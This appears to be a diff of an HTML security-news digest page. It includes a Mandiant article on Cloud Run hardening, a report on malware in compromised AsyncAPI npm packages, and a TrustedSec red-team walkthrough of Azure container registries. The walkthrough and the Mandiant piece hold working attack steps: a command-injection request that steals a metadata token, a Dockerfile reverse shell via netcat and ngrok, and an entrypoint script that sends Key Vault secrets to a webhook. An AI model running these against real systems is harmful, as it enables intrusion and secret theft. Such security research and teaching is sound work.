-Best Practice: Never store secrets or credentials within the source code or local container files. Utilize a dedicated secrets management solution, such as Secret Manager.
-Code Execution/Command Injection
-In the following scenario, a Python function uses shell execution methods with unsanitized user input, allowing an attacker to execute arbitrary commands.
-import functions_framework
-import subprocess
-@functions_framework.http
-def hello_http(request):
-request_json = request.get_json(silent=True)
-request_args = request.args
-if request_json and 'input' in request_json:
-input = request_json['input']
-elif request_args and 'input' in request_args:
-input = request_args['input']
-result = subprocess.run(input, shell=True,capture_output=True, text=True)
-return format(result)
-Figure 4: Python function utilizing shell execution with unsanitized user input
-This allows an attacker to execute a subsequent curl request targeting the GCP metadata service to retrieve the service account’s bearer token.
-The following request extracts the service account's OAuth 2.0 bearer token, which remains valid for 1 hour:
-curl -X POST https://cloudrun02-abc.europe-west3.run.app/ -H "Content-Type: application/json" -d "{\"input\": \"curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'\"}"
-Figure 5: Extraction of a GCP service account bearer token via a curl request
-Once obtained, an attacker can use it on an attacker-controlled system to execute Google Cloud CLI commands. For example the CLOUDSDK_AUTH_ACCESS_TOKEN
-environment variable can be set using the stolen bearer token.
-export CLOUDSDK_AUTH_ACCESS_TOKEN=”obtain bearer token”
-Figure 6: Defining CLOUDSDK_AUTH_ACCESS_TOKEN environment variable
-Attackers can then leverage Google Cloud Cloud CLI within the security context of the Cloud Run Compute service account. If deployed without best practices and thoughtful configuration controls, for example, if the Cloud Run service runs as the default compute service account with Editor permissions, this would be equivalent to a full GCP project takeover, and allow the attacker to:
--
-Read/write/delete most GCP resources
--
-Deploy new services and modify existing configurations
--
-Access secrets and encryption keys
--
-Exfiltrate data across all accessible storage systems
--
-Establish persistent backdoors through new service accounts or SSH keys.
-Hardening Recommendations
-Mandiant recommends that organizations implement parallel approaches for effective serverless security:
--
-Secure Software Development Lifecycle (S-SDLC): integrate security scanning, code review, least-privilege IAM into CI/CD pipelines before deployment and integrate continuous security testing;
--
-Vibe Coding: Mandiant recommends multi-layered security enforcement for AI-generated code or "vibe coding." Organizations should isolate AI experimentation within dedicated sandbox environments and enforce strict data egress controls to protect production systems and internal data. Furthermore, development environments should be restricted to approved IDEs with human-in-the-loop capabilities, utilizing only verified plugins operating under least privilege to mitigate supply chain vulnerabilities. Finally, organizations must ensure this AI-generated software follows Secure Software Development Lifecycle (S-SDLC) controls while establishing clear internal guidelines regarding permitted use cases. Comprehensive security fundamentals for vibe coding are documented in detail within the
-[Wiz Vibe Coding Security Fundamentals blog](https://www.wiz.io/academy/ai-security/vibe-coding-security). -
-Compensating Runtime Controls: Implement the following defense-in-depth measures to limit and contain compromise even when application vulnerabilities exist;
-Segregate Public Services
-Host public-facing Cloud Run services consumed by untrusted external entities in a dedicated, isolated Google Cloud project. This ensures a compromise does not provide an immediate path to critical internal resources. The implementation of this 'Service Project' model is beyond the scope of this post; however, it is documented in detail within the [secured serverless architecture blueprint](https://docs.cloud.google.com/architecture/blueprints/serverless-blueprint).
-Identity and Access Management (IAM)
-Mandiant recommends using a custom service account for service authentication rather than the default Compute Engine service account, following the principle of least privilege. Grant only the specific permissions necessary for the Cloud Run function to operate, for example:
--
-Cloud Storage Bucket Access: If the service only requires read access to objects from a Cloud Storage bucket, grant the
-Storage Object Viewer
-(roles/storage.objectViewer
-) role restricted to that specific bucket. -
-Secret Manager Access: If the service requires access to secrets, grant the
-Secret Manager Secret Accessor
-(roles/secretmanager.secretAccessor
-) role only to the individual secrets required. For further details on secret access from Cloud Run, refer to the[GCP documentation on configuring secrets](https://docs.cloud.google.com/run/docs/configuring/services/secrets#required_roles).
-Layer 7 Application Load Balancer (ALB) Architecture
-Restrict ingress traffic for serverless functions to internal only and use an external Layer 7 ALB to manage internet exposure. This provides:
--
-Centralized Traffic Management: Granular control over headers and SSL policies.
--
-Cloud Armor Integration: Web Application Firewall (WAF) support to harden applications against vulnerabilities such as Local/Remote File Inclusion (LFI/RFI) and Server-Side Request Forgery (SSRF).
--
-Traffic Shaping: Implementation of rate limits and request limitations to prevent abuse.
--
-Enhanced Visibility: Robust logging and log-forwarding capabilities for security monitoring.
--
-Identity-Aware Proxy (IAP): integration support for scenarios requiring specific identity-based authentication for internal users.
-Web Application Firewall (WAF) — Cloud Armor
-[Cloud Armor](https://cloud.google.com/security/products/armor) provides WAF protections that can be integrated with the Load Balancer to filter malicious traffic. The following examples demonstrate how to configure Cloud Armor security policies to block the specific local file inclusions, remote code execution and traversal attacks previously outlined.
-Local File Inclusion
-The lfi-v33-stable
-preconfigured WAF rules can block common local file inclusion attacks ([local file inclusion reference](https://docs.cloud.google.com/armor/docs/waf-rules#local_file_inclusion_lfi)).
-evaluatePreconfiguredWaf('lfi-v33-stable', {'sensitivity': 3})
-Figure 7: Cloud Armor lfi-v33-stable WAF rule configuration
-Blocking a path traversal request ../../../etc/passwd
-resulting in a 403 forbidden:
-curl -X POST https://exampleabc01.com -H "Content-Type: application/json" -d '{"file": "../../../etc/passwd}'
-<!doctype html><meta charset="utf-8"><meta name=viewport content="width=device-width, initial-scale=1"><title>403</title>403 Forbidden
-Figure 8: Verification of Cloud Armor blocking path traversal request, resulting in a 403 forbidden
-Remote Code Execution
-The rce-v33-stable
-preconfigured WAF rules can block remote code execution attempts ([remote code execution reference](https://docs.cloud.google.com/armor/docs/waf-rules#remote_code_execution_rce)).
-evaluatePreconfiguredWaf('rce-v33-stable', {'sensitivity': 3})
-Figure 9: Cloud Armor rce-v33-stable WAF rule configuration
-Blocking the remote code execution request from the previous example results in a 403 forbidden:
-curl -X POST https://exampleabc01.com -H "Contencurl -X POST https://exampleabc01.com -H "Content-Type: application/json" -d "{\"input\": \"curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'\"}"
-<!doctype html><meta charset="utf-8"><meta name=viewport content="width=device-width, initial-scale=1"><title>403</title>403 Forbidden
-Figure 10: Verification of Cloud Armor blocking Remote Code execution, resulting in a 403 forbidden
-Serverless Architecture Controls
-Hardening Cloud Run services is only one part of a secure architecture. Because these services often connect to other Google Cloud resources, a single compromise can expose additional services. Implementing defense-in-depth is critical. Specifically, when using direct VPC egress or VPC Access connectors, use VPC Service Controls to restrict lateral movement and exfiltration through granular access policies.
-Secure Software Development Lifecycle (S-SDLC)
-While the previously outlined hardening strategies are critical, the ideal standard remains the proactive identification of vulnerabilities during the initial development stages. A deep dive into "Shift-Left" security is beyond the scope of this analysis, which focuses on mitigating risks within existing code. However, a Secure Software Development Lifecycle (S-SDLC) remains a fundamental principle. Robust code validation and continuous security testing are essential to neutralize threats before serverless functions are published externally.
-Cloud Run Threat Detection
-Beyond the hardening recommendations outlined in this post, [Google Cloud Security Command Center (SCC)](https://cloud.google.com/security/products/security-command-center) provides built-in services to detect control plane attacks against Cloud Run resources. These include detectors for credential access, reconnaissance, and the execution of scripts or reverse shells. The [Cloud Run Threat Detection](https://docs.cloud.google.com/security-command-center/docs/cloud-run-threat-detection-overview) service is available for Premium and Enterprise tiers.
-Conclusion
-Serverless applications drive agility and rapid business value. While "vibe-coding" has made it easier than ever to deploy code, this breakneck speed demands that teams integrate security early in the development lifecycle, move beyond default configurations, and prioritize a defense-in-depth strategy centered on identity and architecture.
-Acknowledgements
-This analysis would not have been possible without the assistance of Ischa Rijff, Phil Pearce, and Juraj Sucik.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
-            <h2 class="article-title">CISA warns admins to patch actively exploited SharePoint flaws</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-warns-admins-to-patch-actively-exploited-sharepoint-flaws/" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned Tuesday that attackers are actively exploiting three vulnerabilities to hack Internet-exposed on-premises SharePoint Server instances. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-6" class="article-body">
-            <h2 class="article-title">Compromised AsyncAPI npm Packages Deliver Multi-Stage Botnet Malware</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/compromised-asyncapi-npm-packages.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Four compromised npm packages in the @asyncapi namespace have been observed distributing a multi-stage botnet loader, according to findings from [OX Security](https://www.ox.security/blog/asyncapi-npm-organization-compromised-2m-weekly-downloads-affected/), [SafeDep](https://safedep.io/asyncapi-generator-supply-chain-attack-miasma-rat/), [Socket](https://socket.dev/blog/asyncapi-supply-chain-attack), and [StepSecurity](https://www.stepsecurity.io/blog/compromised-next-branch-pushes-malicious-asyncapi-generator-generator-helpers-and-generator-components-to-npm).
-The affected packages are listed below -
-- @asyncapi/generator-helpers@1.1.1
-- @asyncapi/generator-components@0.7.1
-- @asyncapi/generator@3.3.1
-- @asyncapi/specs(v6.11.2, v6.11.2-alpha.1)
-"The compromised packages deploy an obfuscated first-stage payload that downloads an encrypted second-stage payload, identified as Miasma, from IPFS," Socket said.
-The poisoned packages ship a hidden JavaScript implant, with each of them containing an injected source file that decodes to the same second-stage downloader. Unlike previous iterations that leveraged install hooks to trigger the execution of a JavaScript payload, the malicious code in this case is run when the infected module is loaded by Node.js, after which it launches a detached background node that downloads and executes the malware from IPFS.
-The next-stage payload is an encrypted JavaScript loader named "sync.js," which is written to operating system-specific paths and executed. The downloader URL is "ipfs[.]io/ipfs/QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9." The loader contains two components -
-- The encrypted final JavaScript payload, which decodes to the Miasma tasking framework
-- A large encrypted blob used by the runtime's spawn-chain framework
-The framework bundles 744 modules and is built as a command framework that supports six independent command-and-control (C2) communication channels using HTTP, Nostr relay, IPFS, BitTorrent DHT, libp2p GossipSub P2P mesh, and an Ethereum smart contract.
-Besides facilitating credential theft, AI tool poisoning, LAN lateral movement, and worm-like propagation on npm, PyPI, and Cargo registries, Miasma features a persistence mechanism of its own, setting up a systemd, crontab, macOS launchd, and Windows Registry autostart keys.
-"Although the malware has some similarities to the [Shai-Hulud and Miasma](https://thehackernews.com/2026/06/miasma-malware-targets-npm-packages-and.html) campaigns, and it contains the Miasma string multiple times inside its code, this malware isn't the same as them, nor is it attributed to the Miasma/Shai-Hulud/TeamPCP campaigns that we've seen in the past," OX Security's Moshe Siman Tov Bustan said.
-Furthermore, it incorporates a dead man's switch that monitors a stolen token and triggers a directory wipe if the token is revoked, while avoiding systems identified as sandboxes or virtual environments, as well as those that have their current language set to Russian or have security tools from CrowdStrike, SentinelOne, Microsoft Defender, CarbonBlack, Cylance, Osquery, Tanium, and Qualys installed.
-"Its clearest operational path is REST-based C2: the implant beacons to an HTTP endpoint, accepts encrypted tasking, and posts command results back to the same infrastructure. Around that core, the payload also carries support for upload transport, command ciphering, node signing, payload updates, file management, shell execution, and persistence writing."
-According to StepSecurity, the attacker is said to have gained push access to the repositories and used the project's own legitimate GitHub Actions release pipeline to publish packages with valid OIDC provenance attestations. The supply chain attack did not involve the theft of an npm token.
-"Both attacks are CI/CD pipeline compromises, not stolen npm tokens or malicious maintainers," security researcher Rohan Prabhu said. "The attacker pushed commits under a placeholder git identity and let each repository's real release workflow do the publishing via npm's GitHub OIDC trusted-publisher integration."
-"The resulting packages carry legitimate SLSA provenance attestations, proving only that the project's authorized workflow produced them, not that the triggering commits were legitimate. Provenance does not protect against a compromised push credential."
-All five malicious versions have since been unpublished from the npm registry. It's advised to treat any endpoint that imported or executed one of the affected package versions as potentially compromised. However, it bears noting that exposure depends on whether the infected module was loaded as part of a build or a developer workflow.
-"There is no preinstall/postinstall/install script anywhere in any of the three package.json files," StepSecurity said. "This dropper fires when the poisoned module is require()d during normal use of the generator: the moment a build or CI job actually calls into the library, not at npm install time."
-Update
-SafeDep has characterized the malware as "either a private, parallel build by the same operators or a separate group that adopted the Miasma brand after the source was published." Microsoft, which is tracking the malicious artifacts under the names MiasmStealer and Supychain, said the campaign executes at module-load time, unlike the more common postinstall-hook supply chain attack pattern.
-"When any consuming build or application imports a poisoned package, the injected block runs immediately," the tech giant's security research team [said](https://www.microsoft.com/en-us/security/blog/2026/07/15/unpacking-asyncapi-npm-supply-chain-compromise-import-time-payload-delivery/). "Because the trigger is an import rather than an install script, the common npm install –ignore-scripts mitigation does not neutralize it."
-Microsoft also noted that the compromise originated from a [pwn request](https://thehackernews.com/2026/06/github-updates-actionscheckout-to-block.html) against the "asyncapi/generator" repository stemming from a misconfigured GitHub Actions workflow ("pull_request_target").
-"The asyncapi/generator repository contained a workflow file that used pull_request_target to trigger on pull requests, but then checked out the pull request's code rather than the base branch," Wiz researchers Rami McCarthy and Merav Bar [said](https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions). "This is dangerous because pull_request_target runs in the context of the base repository with full access to secrets. When the workflow checks out attacker-controlled code from the pull request and executes it, those secrets become accessible."
-The Google-owned security firm said the potential for pwn request had been identified as far back as April 2026, when a researcher named Florence Njeri [submitted](https://github.com/asyncapi/generator/pull/2078) a proof-of-concept (PoC) payload that exploited the vulnerability. A pull request containing the fix remained open and unmerged when the attack took place on July 14, 2026.
-While the payload shares some technical characteristics with the Miasma malware framework previously documented in Shai-Hulud supply chain attacks, the activity has not been conclusively tied to a specific threat actor. "The Miasma branding may reflect code reuse, imitation, or deliberate mislabeling," Aikido Security researcher Raphael Silva [said](https://www.aikido.dev/blog/asyncapi-npm-packages-backdoored-via-github-actions). "No definitive attribution is made here."
-Further analysis has determined that several of the implemented features related to credential harvesting, AI-tool poisoning, dead man's switch, and propagation via npm, PyPI, and Cargo vectors have been toggled off, although Microsoft warned that they "could be enabled through persistence."
-(The story was updated after publication to include additional insights.)
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">Microsoft Patches a Record 570 Security Flaws</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/07/microsoft-patches-a-record-570-security-flaws/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft Corp. today released software updates to plug at least 570 security holes in its Windows operating systems and other software, almost triple the number of vulnerabilities the software giant fixed in its record-smashing Patch Tuesday release last month. Microsoft attributed the burgeoning patch counts to vulnerability discoveries aided by artificial intelligence.
@@ -515,346 +544,114 @@ Finally built out that qemu win 3.11/wfw instance with stripped out UI?
 They should probably go back to their origins and build from win 98 and windows 2000, perhaps windows XP, and drop any lineage post win 7. Let AI slug it out instead of plopping it down with win 10/win 11.
 Sincerely, that is a better option. I feel like we are not grasping the differences between how we code vs how AI code vs how Ai code vs how Dimon might code. I don’t wanna think about Dimon vibe coding. Thinking about Gates vibe coding suddenly sounds kind of fascinating, though. I do wonder how rich ex developers would vibe code now. I worry about how AI might be interested in how we all vibe code differently. Not so scary locally, damn creepy as a communistic concept. Hoping MS never patches any of my personal bugs/flaws. I am guessing those models are taking notes on the catwalk. :/
 Nonsense. It would be just another one of their expensive fiascos. LLM code generators don’t know secure from insecure, just what they’re trained on. That’s why what drew my eye in Brian’s article was the mention of the “remote code execution flaw in Microsoft Copilot”. Mindless AI shovelware creates more problems than it’ll ever solve. An OS based on it would be a nightmare.
+I think the complete opposite, AI struggles to write working code, let alone code without vulnerabilities.
 AI… Are you AI or not?
 Great article and important reminder about the need for regular security updates. With the increasing number of vulnerabilities being discovered, staying informed and using reliable tools has become more important than ever. Resources like https://vanced.com.co/revanced-sync-for-lemmy/ also show how open-source communities continue to create useful solutions for users who value privacy and better digital experiences.
 Impressive. Now let’s compaire: PC Mag, in 1995, reported that M$ was releasing Win95, ->in spite of over 64,000 known bugs and issues<-.
 Do we imagine that number's decreased?
-Microsoft advisory said, some Dell PC maybe cause loop reboots after July updates</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-8" class="article-body">
-            <h2 class="article-title">Pandora’s Container Part 1: Unpacking Azure Container Security</h2>
-            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/pandoras-container-part-1-unpacking-azure-container-security" target="_blank">Original Link</a></p>
-            <div class="content-text">Pandora’s Container Part 1: Unpacking Azure Container Security
-Table of contents
-[Container Registries](#Registries)[Identifying Roles and Registries](#Identifying)[Checking if Admin User is Enabled](#checking)[Enabling Admin User & Retrieving Passwords](#Enabling)[Pushing, Pulling and Tagging](#PPT)[Dissecting Docker Images](#Dissecting)[Modifying a Task With a Managed Identity](#Modifying)[Creating a Malicious YAML File](#Creating)[Running the Task](#Running)[Token Keys and Scope Maps](#Maps)[Creating a Token](#Token)[Change Image](#Change)[“How it’s Supposed to Work”](#How)[My Method for Exfiltration](#Method)[Building a Custom Dockerfile](#Building)[Restart the Container With the Modified Image](#Restart)[Exfil to Listener With ngrok](#Exfil)[Reverse Shell With ngrok](#Reverse)
-Containers have become a foundational component of modern Azure environments. However, the attack surface introduced by services such as container registries, container apps, container instances, and container jobs is often underexplored. This blog series examines common attack techniques targeting Azure container services, including registries, secrets, jobs, keys, container instances, and container apps.
-During testing, I found that a standard reverse shell approach for container image replacement did not work reliably. I developed an alternative technique that embeds IMDS token theft and secret exfiltration directly into a Dockerfile's entrypoint, eliminating the need for a persistent reverse shell connection.
-Again, another shoutout to the [AzRTE course by HackTricks](https://hacktricks-training.com/courses/azrte/) for their amazing content. The course covered a lot of material and helped me understand Azure container security, identity abuse, and more.
-Pre-Requisites
-This blog assumes you at least have reader rights over the container assets. I have included a link to my GitHub repo with scripts you can run from CloudShell to enumerate these permissions.
-[https://github.com/OffsecPierogi/Azure](https://github.com/OffsecPierogi/Azure)
-The following permissions are used for this demo:
-- Microsoft.ContainerRegistry/registries/read
-- Microsoft.ContainerRegistry/registries/write
-- Microsoft.ContainerRegistry/registries/listCredentials/action
-- Microsoft.ContainerRegistry/registries/pull/read
-- Microsoft.ContainerRegistry/registries/push/write
-- Microsoft.ContainerRegistry/registries/tasks/read
-- Microsoft.ContainerRegistry/registries/tasks/write
-- Microsoft.ContainerRegistry/registries/runs/write
-- Microsoft.ContainerRegistry/registries/tokens/read
-- Microsoft.ContainerRegistry/registries/tokens/write
-- Microsoft.ContainerRegistry/registries/scopeMaps/write
-- Microsoft.ContainerInstance/containerGroups/restart/action
-- Microsoft.ContainerInstance/containerGroups/write
-- Microsoft.ContainerRegistry/registries/generateCredentials/action
-The following built-in roles in Azure RBAC have all or some of these permissions assigned to them by default.
-- Owner
-- Contributor
-- AcrPull
-- AcrPush
-Container Registries
-Container Registries (ACR) store and distribute container images in Azure. They can be private (requiring auth) or public. As an attacker, a misconfigured registry lets you pull proprietary images, push backdoored containers or overwrite tags to hijack deployments.
-Enabling Admin Keys & Secret Hunting
-Container registries store and distribute container images. Admin keys allow you to log in as admin and conduct actions on behalf of one.
-Required Permissions:
-- Microsoft.ContainerRegistry/registries/write
-- Microsoft.ContainerRegistry/registries/listCredentials/action
-- Microsoft.ContainerRegistry/registries/push/write
-Full access can also be achieved through having the Contributor role assigned over the resources (used here in the blog) or ACRPush/ACRPull permissions in the data plane. If an attacker gets access to a registry, these are some of the things they can do.
-Full Registry Access:
-- Pull any image - steal your proprietary container images and code
-- Push malicious images - inject backdoored containers into your registry
-- Delete images/repositories - wipe out your entire registry
-- List all repositories - reconnaissance on your infrastructure
-- Overwrite tags (like latest) - replace legitimate images with compromised ones
-Identifying Roles and Registries
-We sign in and begin enumerating our role assignments. We then enumerate what role our user is assigned over the registry asset.
-az role assignment list \
---assignee $(az ad signed-in-user show --query id -o tsv) \
---scope $(az acr show -n <REGISTRY_NAME> --query id -o tsv) \
--o table
-We enumerate container registries within our tenant using the following az cli command:
-az acr list
-Checking if Admin User is Enabled
-We then check whether an admin user is enabled for the registry, which can allow you to sign in with Docker.
-az acr show --resource-group <resource-group> --name <ACRname> --query "adminUserEnabled"
-In the portal:
-Enabling Admin User & Retrieving Passwords
-If the admin user is not enabled, you can use the following command to enable it.
-az acr update --resource-group $RESOURCE_GROUP --name $ACR_NAME --admin-enabled true
-We then list credentials for the admin user since it was enabled.
-We can then log in with Docker to list the images as the admin user we obtained credentials for.
-docker login $ACR_NAME.azurecr.io -u <REGISTRY_NAME> -p <PASSWORD>
-Pushing, Pulling and Tagging
-Here are commands for pushing and tagging images with Docker.
-docker tag <IMAGE> <ACR_NAME>.azurecr.io/<IMAGE>:<TAG> && docker push <ACR_NAME>.azurecr.io/<IMAGE>:<TAG>
-Listing images show that our image was successfully pushed to the registry.
-docker images
-The following command pulls the image from the registry that we pushed earlier.
-docker pull $ACR_NAME.azurecr.io/<IMAGE>:<TAG>
-Dissecting Docker Images
-Once we have a Docker image pulled down, we can create a Docker container from the image to look for secrets or use a tool like dive to look layer by layer.
-docker create $ACR_NAME.azurecr.io/<IMAGE>:<TAG>
-OR
-dive $ACR_NAME.azurecr.io/<IMAGE>:<TAG>
-OR
-docker inspect $ACR_NAME.azurecr.io/<IMAGE>:<TAG>
-This is a good way to do secret hunting for container images and find some goodies that could be used later in the cloud environment. Environment variables, suspicious files, and more are all fair game.
-Modifying a Task With a Managed Identity
-ACR Tasks are automated workflows that can build, push, and patch container images. Tasks can have managed identities attached, granting them access to other Azure resources like Key Vaults. If an attacker can modify or create tasks, they can leverage that identity to access secrets. This identity configuration is shown here in case anyone wants to replicate this in their lab.
-ACR Tasks can have system-assigned or user-assigned managed identities. If an identity is present, modify the task to abuse those permissions. To check, run:
-az acr task show --registry <REGISTRY_NAME> --name <TASK_NAME>
---query identity
-Required Permissions:
-- Microsoft.ContainerRegistry/registries/tasks/write
-- Microsoft.ContainerRegistry/registries/runs/write
-Creating a Malicious YAML File
-In this attack, you create a YAML file and specify what action you want the identity to perform. You then create a task or update it to execute the command.
-A YAML file like the one below will be used to create the task to obtain a secret from a vault.
-version: v1.1.0
-secrets:
-- id: <SECRET_NAME>
-keyvault: https://<VAULT_NAME>.vault.azure.net/secrets/<SECRET_NAME>
-steps:
-- command: bash echo 'Secret={{.Secrets.<SECRET_NAME>}}'
-Running the Task
-If a task is not already present over the registry, we will create one as shown below. Otherwise, you will modify the task that has the assigned identity.
-az acr task create --registry <REGISTRY_NAME> --name <TASK_NAME> --file acr-task.yaml --context /dev/null --assign-identity
-az acr task modify --registry <REGISTRY_NAME> --name <TASK_NAME> --file acr-task.yaml --context /dev/null
-We will then manually run the task in order for it to carry out its function and obtain a secret from the vault.
-az acr task run --registry <REGISTRY_NAME> --name <TASK_NAME>
-Token Keys and Scope Maps
-Token Keys allow you to generate tokens for repository access; the Azure description is as follows:
-“A token along with a password lets you authenticate with the registry. A token is associated with a scope map which consists of permitted actions scoped to one or more repositories. Expiration time can be set for token credentials.”
-Scope maps define granular permission sets for repository-level access. This is the underlying mechanism behind ACR tokens, as the token is associated with a scope map that determines what repositories and operations it can access.
-Required Permissions:
-- Microsoft.ContainerRegistry/registries/tokens/write
-- Microsoft.ContainerRegistry/registries/scopeMaps/write
-- Microsoft.ContainerRegistry/registries/generateCredentials/action
-Creating a Token
-We begin by creating a token for the target registry, specifying a scope map that defines the permissions granted to the token. An example of a scope map and its permissions are shown below.
-We then create the token and log in to the registry with our new credentials.
-az acr token create --name <TOKEN_NAME> --registry <ACR_NAME> --scope-map <SCOPE_MAP>
-docker login <ACR_NAME>.azurecr.io -u <TOKEN_NAME> -p <PASSWORD>
-You can then pull images and rummage for secrets when you authenticate with the created credentials using a Docker login.
-The below commands allow you to dive (literally) into the container image so you can enumerate secrets, env variables, and more.
-dive $ACR_NAME.azurecr.io/<IMAGE>:<TAG>
-container_id=$(docker create <REGISTRY_NAME>.azurecr.io/<IMAGE>:<TAG>)
-docker cp $container_id:/ ./extracted_container
-Successfully copied 154MB to /home/extracted_container
-docker rm $container_id
-0b8bebd775f53a4f0vbeb4c7d25fg4a5d6175fba18d56e217e33c39693b43f88
-docker inspect <REGISTRY_NAME>.azurecr.io/<IMAGE>:<TAG> | jq '.[0].Config.Env[]' | grep 'secret'
-Change Image
-An attacker with these permissions could replace a legitimate container image with a malicious image under their control. By modifying the image or associated Dockerfile, the attacker may gain the ability to execute arbitrary code, harvest credentials, establish persistence, or exfiltrate sensitive data from the environment.
-Permissions:
-- Microsoft.ContainerRegistry/registries/pull/read
-- Microsoft.ContainerRegistry/registries/push/write
-- Microsoft.ContainerInstance/containerGroups/restart/action
-- Microsoft.ContainerInstance/containerGroups/write
-Before the demonstration, I highly encourage you to install ngrok or a similar tool in order to catch the reverse shell connection.
-We sign in as the HSmith user, who has the necessary permissions over the container registry.
-az account show
-Enumerating Registries
-Running the following command, we can enumerate the target registry name, you can also specify a specific resource group.
-az acr list
-Now, with the registry name obtained, we can name repositories within the registry.
-az acr repository list --name <REGISTRY_NAME>
-az acr login --name <REGISTRY_NAME>
-Once logged in, you will want to pull an image you intend to modify for legit helpful purposes.
-docker pull <IMAGE>
-“How it’s Supposed to Work”
-From here, we will want to modify the newly pulled image and add a reverse shell to its functionality to gain RCE. You will create a Dockerfile and add the content you want, including your shell command. We will be using this:
-Build a new image with a reverse shell:
-FROM python:3.9-slim
-# Install netcat and azure cli
-RUN apt-get update && \
-apt-get install -y netcat-traditional
-WORKDIR /app
-# Add a reverse shell command that connects back to our system
-CMD nc -e /bin/bash <ENTIRE NGROK URL>
-Make sure you start your Netcat listener and ngrok.
-ngrok tcp <DESIRED PORT>
-You will then do this in a separate terminal:
-nc -lvnp <SAME DESIRED PORT>
-Once this is all running in the background, we can work our magic.
-At this point, we will push the image to Docker and restart the container, after which we should get a connection back to our Netcat listener.
-nano Dockerfile
-docker build -t <IMAGE>:<TAG> <DIRECTORY>
-For reasons related to how Docker handles the latest tag, I needed to retag the image. You generally shouldn’t run into this if you use a versioned (immutable) tag instead of latest, since latest can be reassigned to different image digests. We successfully pushed the container image to the registry.
-docker push <REGISTRY_NAME>.azurecr.io/<IMAGE>:<TAG>
-Next, you would typically restart the container asset and gain a shell… but this didn’t happen for me in the course or in my lab.
-Actual footage:
-For some context:
-Your shell may have not worked for a few reasons.
-- Firewall rules
-- Typo within the image/shell
-- The container instance doesn’t use the target registry or image
-NOTE:
-From there, the process would typically involve running a docker build, pushing it with docker push, and restarting the container. Next, you would get the shell. Unfortunately, this didn’t work for me in the HackTricks course (even with lab support), nor in my own Azure lab. I spent A LOT of time trying to recreate this but was unsuccessful.
-So, this is a new way, with what I discovered. This method will abuse container permissions and the assigned identity permissions to the container to exfiltrate a vault secret to a webhook.
-My Method for Exfiltration
-Exfil Vault Secrets to Webhook
-Permissions:
-- Microsoft.ContainerRegistry/registries/push/write
-- Microsoft.ContainerInstance/containerGroups/restart/action
-After an absolute plethora of reading, research, testing, and head smashing, this is what I discovered. I ended up trying a lot of different shells and found one that was repeatedly successful for me.
-Building a Custom Dockerfile
-You start off building a Dockerfile for the image you plan to update. The following Dockerfile will run an update, create an /app directory, and gather secret information, including the final value, by getting a token as the system-assigned identity.
-cat Dockerfile
-FROM python:3.9-slim
-RUN apt-get update && \
-apt-get install -y bash curl jq ca-certificates && \
-rm -rf /var/lib/apt/lists/*
-WORKDIR /app
-RUN printf '%s\n' \
-'#!/bin/bash' \
-'echo "Container starting..."' \
-'echo "Requesting Managed Identity token..."' \
-'' \
-'TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r .access_token)' \
-'' \
-'if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then' \
-' echo "Failed to get token"' \
-' exit 1' \
-'fi' \
-'' \
-'echo "Fetching secret from Key Vault..."' \
-'SECRET=$(curl -s -H "Authorization: Bearer $TOKEN" https://<VAULT_NAME>.vault.azure.net/secrets/Image?api-version=7.4 | jq -r .value)' \
-'' \
-'if [ -z "$SECRET" ] || [ "$SECRET" = "null" ]; then' \
-' echo "Failed to fetch secret"' \
-' exit 1' \
-'fi' \
-'' \
-'echo "Sending secret to webhook..."' \
-'curl -X POST -H "Content-Type: application/json" -d "{\"secret\":\"$SECRET\"}" <WEBHOOK>' \
-'' \
-'echo "Done."' \
-'sleep 3600' \
-> /entrypoint.sh && \
-chmod +x /entrypoint.sh
-ENTRYPOINT ["/entrypoint.sh"]
-At this point, you’re going to want to build the image but specify a platform (I am on an M4 ARM-based Mac). We build it for the AMD64 Linux platform that the container is running, as shown below. If you don’t specify a platform, you may run into issues (ask me how I know).
-We also run a multi-arch buildx command that provides multi-platform support. Once the image is built, we push it to the registry like normal.
-docker buildx create --use --name multiarch
-docker buildx build --platform <PLATFORM> -t <REGISTRY_NAME>.azurecr.io/<IMAGE>:<TAG> --load <DIRECTORY>
-docker push <REGISTRY_NAME>.azurecr.io/<IMAGE>:<TAG>
-Restart the Container With the Modified Image
-Restart the container (NOTE: the container must be using the image + tag that you’re building and pushing to apply your image).
-az container restart --resource-group <RESOURCE_GROUP> --name <CONTAINER_NAME>
-Anddddd voila. You can see the exfiltrated secret in our webhook and see the logs from the container of our malicious image going through its process.
-Exfil to Listener With ngrok
-We follow the same process, but instead of a webhook, we specify our ngrok address that will forward traffic to a local port. Restart the container with a listener in a separate terminal.
-Below is the secret value intercepted with your Netcat listener.
